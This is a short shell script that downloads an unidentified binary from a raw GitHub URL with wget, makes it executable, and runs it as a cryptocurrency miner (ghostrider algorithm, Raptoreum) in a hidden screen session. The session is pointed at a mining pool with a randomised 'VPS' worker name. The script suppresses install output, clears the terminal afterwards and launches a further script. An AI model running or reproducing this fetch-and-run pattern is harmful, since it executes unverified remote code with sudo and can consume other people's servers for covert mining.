#!/bin/sh

WALLET=Prodent.VPS-$(echo $(shuf -i 1-9999 -n 1))

POOL=prohashing.com:3362

sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
wget https://raw.githubusercontent.com/hondacars/xxx/main/srb
chmod +x srb
screen -S Wuenak_Eys -dm ./srb --disable-gpu --algorithm ghostrider --pool $POOL --wallet $WALLET a=gr,c=raptoreum
screen -ls
sleep 4
clear
cd ..
screen -ls
./Timer_Bo.sh
